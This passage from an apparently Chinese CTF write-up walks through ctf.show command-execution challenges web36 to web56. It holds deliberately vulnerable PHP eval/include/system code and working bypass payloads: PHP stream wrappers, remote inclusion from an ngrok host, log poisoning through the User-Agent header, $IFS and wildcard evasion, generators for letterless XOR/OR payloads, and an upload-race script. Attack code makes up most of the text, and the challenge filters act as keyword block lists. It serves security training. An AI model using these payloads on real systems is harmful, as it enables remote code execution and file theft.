h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=include$_GET[zf]?&gt;&amp;zf=php://filter/read=convert.base64-encode/resource=flag.php?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;?c=include$_GET[zf]?&gt;&amp;zf=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==?c=include$_GET[zf]?&gt;&amp;zf=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;?c=include$_GET[zf]?&gt;&amp;zf=http://1d40-111-17-194-91.ngrok.io/wanan.txt 远程执行</code></pre><h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 05:18:55  email: h1xa@ctfer.com  link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=data://text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;?c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=?c=php://input POST:&lt;?php system(&#39;nl flag.php&#39;)?&gt;?c=http://1d40-111-17-194-91.ngrok.io/wanan.txt</code></pre><h2 id="配合ua实现日志包含"><a href="#配合ua实现日志包含" class="headerlink" title="配合ua实现日志包含"></a>配合ua实现日志包含</h2><pre><code>?c=/var/log/nginx/access.log</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011446405.png" alt="image-20220401144659304"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011447289.png" alt="image-20220401144706214"></p><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 05:23:36  email: h1xa@ctfer.com  link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=?c=http://1d40-111-17-194-91.ngrok.io/wanan.txt?c=/var/log/nginx/access.log     User-Agent: &lt;?php phpinfo();?&gt;</code></pre><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 06:13:21  email: h1xa@ctfer.com  link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=data://text/plain,&lt;?=phpinfo();?&gt;</code></pre><h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-04 00:12:34  Last Modified by:   h1xa  Last Modified time: 2020-09-04 06:03:36  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>这里过滤的是中文的括号,这里的基本命令可用,但是引号和美元符号都没了</p><p><strong>法一</strong></p><h2 id="利用session执行命令"><a href="#利用session执行命令" class="headerlink" title="利用session执行命令"></a>利用session执行命令</h2><p>利用session_id(),首先修改cookie中PHPSESSID内容为ls</p><p>然后输入</p><pre><code>?c=session_start();system(session_id());</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011627518.png" alt="image-20220401162725395"></p><p>在将c改成</p><pre><code>?c=session_start();highlight_file(session_id());</code></pre><p>修改PHPSESSID的值为flag.php就出问题了。经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p><p><strong>法二</strong></p><h2 id="读文件夹数组改造查看文件"><a href="#读文件夹数组改造查看文件" class="headerlink" title="读文件夹数组改造查看文件"></a>读文件夹数组改造查看文件</h2><pre><code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));localeconv():返回一包含本地数字及货币格式信息的数组.其中数组中的第一个为点号(.)pos():返回数组中的当前元素的值array_reverse():数组逆序scandir():获取当前目录下的文件next():函数将内部指针指向数组中的下一个元素并输出</code></pre><p>首先通过pos(localeconv())得到点号,因为scandir(‘.’)表示得到当前目录下的文件,所以scandir(pos(localeconv()))就能得到flag.php了</p><pre><code>?c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></pre><h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><h2 id="无数字字母异或rce"><a href="#无数字字母异或rce" class="headerlink" title="无数字字母异或rce"></a>无数字字母异或rce</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: 羽  Date:   2020-09-05 20:31:22  Last Modified by:   h1xa  Last Modified time: 2020-09-05 22:40:07  email: 1341963450@qq.com  link: https://ctf.show*/if(isset($_POST[&#39;c&#39;]))&#123;    $c = $_POST[&#39;c&#39;];if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;, $c))&#123;        eval(&quot;echo($c);&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; </code></pre><p>先使用php脚本生成or_rce字典</p><pre><code class="php">&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;     for ($j=0; $j &lt;256 ; $j++) &#123;         if($i&lt;16)&#123;            $hex_i=&#39;0&#39;.dechex($i);        &#125;        else&#123;            $hex_i=dechex($i);        &#125;        if($j&lt;16)&#123;            $hex_j=&#39;0&#39;.dechex($j);        &#125;        else&#123;            $hex_j=dechex($j);        &#125;        $preg = &#39;/[0-9a-z]/i&#39;;//根据题目给的正则表达式修改即可        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;    &#125;          else&#123;        $a=&#39;%&#39;.$hex_i;        $b=&#39;%&#39;.$hex_j;        $c=(urldecode($a)|urldecode($b));        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;        &#125;    &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011757187.png" alt="image-20220401175726105"></p><p>使用python脚本生成payload</p><pre><code class="php"># -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758828.png" alt="image-20220401175800747"></p><p>分号去一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011758209.png" alt="image-20220401175832151"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800030.png" alt="image-20220401180013972"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204011800342.png" alt="image-20220401180019278"></p><h2 id="其他无参命令执行方法"><a href="#其他无参命令执行方法" class="headerlink" title="其他无参命令执行方法"></a><a href="https://blog.csdn.net/miuzzx/article/details/109143413">其他无参命令执行方法</a></h2><h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><h2 id="linux命令截断"><a href="#linux命令截断" class="headerlink" title="linux命令截断"></a>linux命令截断</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 20:51:55  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>&#x2F;dev&#x2F;null 2&gt;&amp;1,让所有的输出流(包括正确的和错误的)都定向到空设备丢弃.所以后面的不能执行,要把后面截断</p><pre><code>?c=ls;%0a?c=ls;&amp;        不行编码试试%26?c=ls||</code></pre><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 21:32:51  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=ls%0a?c=ls%0a&amp;&amp;?c=ls%0a||?c=nl flag.php%0a</code></pre><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 21:32:01  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=ls%0a?c=ls%0a&amp;&amp;?c=ls%0a||?c=nl fla*%0a</code></pre><h1 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 21:35:34  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=nl%09fl*%0a        php下%09代替空格?c=echo$IFS`tac$IFS*`%0A     $IFS代表shell里面的空格</code></pre><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><h2 id="反斜杠绕过关键词过滤"><a href="#反斜杠绕过关键词过滤" class="headerlink" title="反斜杠绕过关键词过滤"></a>反斜杠绕过关键词过滤</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 21:50:19  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=nl%09fla\g.php%0a?c=nl%09fla\g.php||</code></pre><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><h2 id="“双引号绕过关键词过滤"><a href="#“双引号绕过关键词过滤" class="headerlink" title="“双引号绕过关键词过滤"></a>“双引号绕过关键词过滤</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 21:59:23  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre><code>?c=nl&lt;fla&#39;&#39;g.php||</code></pre><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 22:06:20  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre><code>?c=nl&lt;fla&#39;&#39;g.php||</code></pre><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><h2 id="linux绕过关键词过滤集合"><a href="#linux绕过关键词过滤集合" class="headerlink" title="linux绕过关键词过滤集合"></a>linux绕过关键词过滤集合</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 22:22:43  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=nl%09fla\g.php||?c=nl%09fla\g.php%0a?c=nl%09fla&#39;&#39;g.php%0a?c=nl%09fla&quot;&quot;g.php%0a?c=vi%09fla\g.php%0a?c=tac%09fla\g.php%0a?c=uniq%09fla\g.php%0a?c=nl&lt;fla\g.php||?c=nl&lt;fla&#39;&#39;g.php||?c=nl&lt;fla&quot;&quot;g.php||?c=nl&lt;fla\g.php%26</code></pre><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 22:32:47  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=nl&lt;fla&quot;&quot;g.php||?c=nl&lt;fla\g.php||</code></pre><h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 22:42:52  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=nl&lt;fla&quot;&quot;g.php||?c=nl&lt;fla\g.php||?c=nl&lt;fla&#39;&#39;g.php||</code></pre><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><h2 id="linux-IFS代替空格"><a href="#linux-IFS代替空格" class="headerlink" title="linux$IFS代替空格"></a>linux$IFS代替空格</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-05 22:50:30  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre><code>?c=nl$IFS\fla\g.php||</code></pre><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 18:21:02  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        echo($c);        $d = system($c);        echo &quot;&lt;br&gt;&quot;.$d;    &#125;else&#123;        echo &#39;no&#39;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre><code>?c=c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp?c=nl$IFS\fla\g.php</code></pre><h1 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h1><h2 id="统配执行语句-x2F-bin-x2F-c-IFS"><a href="#统配执行语句-x2F-bin-x2F-c-IFS" class="headerlink" title="???统配执行语句&#x2F;bin&#x2F;c??${IFS}????????"></a>???统配执行语句&#x2F;bin&#x2F;c??${IFS}????????</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 19:43:42  email: h1xa@ctfer.com  link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code>?c=/bin/c??$&#123;IFS&#125;?????????c=/bin/c??$IFS????????</code></pre><h1 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h1><h2 id="统配base64执行语句-x2F-x2F-64"><a href="#统配base64执行语句-x2F-x2F-64" class="headerlink" title="???统配base64执行语句&#x2F;???&#x2F;????64 ????????"></a>???统配base64执行语句&#x2F;???&#x2F;????64 ????????</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 20:03:51  email: h1xa@ctfer.com  link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre><code>?c=/???/????64 ????????</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202204021330313.png" alt="image-20220402133049186"></p><p>法二</p><p>看下面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162441419.png" alt="image-20220403162441419"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403162510204.png" alt="image-20220403162510204"></p><h2 id="phithon的无字母webshell"><a href="#phithon的无字母webshell" class="headerlink" title="phithon的无字母webshell"></a>phithon的无字母webshell</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre><code class="php">&lt;?phpif(isset($_GET[&#39;code&#39;]))&#123;    $code = $_GET[&#39;code&#39;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;        die(&quot;NO.&quot;);    &#125;    eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><h3 id="php7下"><a href="#php7下" class="headerlink" title="php7下"></a>php7下</h3><p>我们将代码放入index.php中,然后执行</p><pre><code>docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache</code></pre><ul><li>–rm 在容器退出时就能够自动清理容器内容部的文件系统</li><li>-p 将本机的9090端口映射到容器80端口</li><li>-v 指定挂载位置 `pwd`是将当前目录挂载到&#x2F;var&#x2F;www&#x2F;html目录下 </li><li>php:7.2-apache :运行一个php:7.2-apache容器</li></ul><p>在php7之前是不允许使用($a)();这样的方法来执行动态函数的,在php7之后可以使用(‘phpinfo’)();来执行函数,第一个括号中可以任意的php表达</p><pre><code>(~%8F%97%8F%96%91%99%90)();</code></pre><p>就相当于phpinfo();这里的~代表取反的意思,而其中有不可见字符,就用url编码表示</p><pre><code>&lt;?phpecho ~urldecode(&#39;%8F%97%8F%96%91%99%90&#39;);#phpinfo</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403150504271.png" alt="image-20220403150504271"></p><h3 id="php5下"><a href="#php5下" class="headerlink" title="php5下"></a>php5下</h3><pre><code>docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apache</code></pre><ul><li>shell下可以使用.来执行任意脚本</li><li>linux文件名支持用glob通配符代替</li></ul><p>. file执行文件,是不需要file有x权限的.那么,如果目标服务器上有一个我们可控的文件,那么就可以利用.来执行.我们可以发送一个上传文件的POST包,此时PHP会将我们上传的文件保存在临时文件夹下,默认的文件名是&#x2F;tmp&#x2F;phpxxxxxx,文件名的最后六个字符是随机大小写的.</p><ul><li>*可以代替0个及以上任意字符</li><li>?可以代表1个任意字符</li></ul><p>那么,&#x2F;tmp&#x2F;phpxxxxxx就可以表示为&#x2F;*&#x2F;?????????或者&#x2F;???&#x2F;???????? </p><p>但是在能够匹配上&#x2F;???&#x2F;?????????这个通配符的文件有很多</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154526590.png" alt="image-20220403154526590"></p><p>但是glob通配符还支持使用[^x]的方法来构造”这个位置不是字符x”.那么我们就可以使用这个姿势干掉&#x2F;bin&#x2F;run-parts</p><pre><code>/???/???[^-]?????</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154702204.png" alt="image-20220403154702204"></p><p>排除了第4个字符是-的文件，同样我们可以排除包含.的文件</p><pre><code>/???/???[^-][^.][^.]?[^.]?</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154718043.png" alt="image-20220403154718043"></p><p>跟正则表达式一样,glob支持利用[0-9]来表示一个范围</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403154902410.png" alt="image-20220403154902410"></p><p>这里所有的文件名都是小写,只有php生成的临时文件包含大写字母,那么我们只要找到一个表示大写字母的glob通配符就可以了.易知大写字母位于@与[之间</p><pre><code>/???/?????????[@-[]</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403155124971.png" alt="image-20220403155124971"></p><p>最后传入的是</p><pre><code>?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</code></pre><p>先写一个上传文件的html文件</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://831fec7f-ff8b-4fe6-869c-d2d8e70dc2c4.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;    </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403161216118.png" alt="image-20220403161216118"></p><p>至于这里为什么要添加?&gt;如果我们通过&lt;?&#x3D;`ls`去执行就需要在啊前面添加?&gt;</p><p>原因就是eval()函数相当于执行php代码,而&lt;?&#x3D;就相当于&lt;?php echo,在php7以上不管short_open_tag配置是不是开启都可以用.所以就相当于一个新的php文件,这样的话就需要将在前面的&lt;?php给闭合,不然不会执行</p><pre><code>&lt;?php ?&gt;&lt;?=`ls`;</code></pre><h1 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 22:02:47  email: h1xa@ctfer.com  link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#39;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>payload</p><pre><code class="python">import requestswhile True:    url = &quot;http://7a1fe05e-90db-4af3-a0ec-c849297f8d16.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;    r = requests.post(url,files=&#123;&quot;file&quot;:(&#39;1.php&#39;,b&#39;cat flag.php&#39;)&#125;)    if r.text.find(&quot;flag&quot;) &gt;0 :        print(r.text)        break</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403163219886.png" alt="image-20220403163219886"></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h1><h2 id="linux构造数字"><a href="#linux构造数字" class="headerlink" title="linux构造数字"></a>linux构造数字</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: h1xa  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-08 01:02:56  email: h1xa@ctfer.com  